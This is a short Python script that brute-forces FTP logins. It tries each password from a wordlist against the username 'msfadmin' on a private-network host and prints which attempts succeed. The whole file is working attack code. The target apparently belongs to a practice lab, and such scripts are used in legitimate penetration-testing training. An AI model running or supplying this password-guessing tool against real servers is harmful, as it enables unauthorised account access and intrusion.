#!/usr/bin/python3.7
from ftplib import FTP
import time

ftpconn = FTP("10.171.1.129")

fail = '\033[91m[-]\033[0m'
ok  = '\033[92m[+]\033[0m'
msg_ok=" BINGO - Username: "
msg_fail=" FAIL - Username: "
msg_pass=" Password: "
username="msfadmin"
wordlist="wordlist.txt"
msg_final="FTP Dictnary Attack finished" 

with open(wordlist, "r") as _word:
    for _line in _word:
        _password = _line.strip("\n")

        try:
            ftpconn.login(username,_password)
            print(ok + msg_ok + username + msg_pass + _password)
            time.sleep(3)
            ftpconn.quit()    

        except:
            print( fail + msg_fail + username + msg_pass + _password)
            time.sleep(5)

print(msg_final)
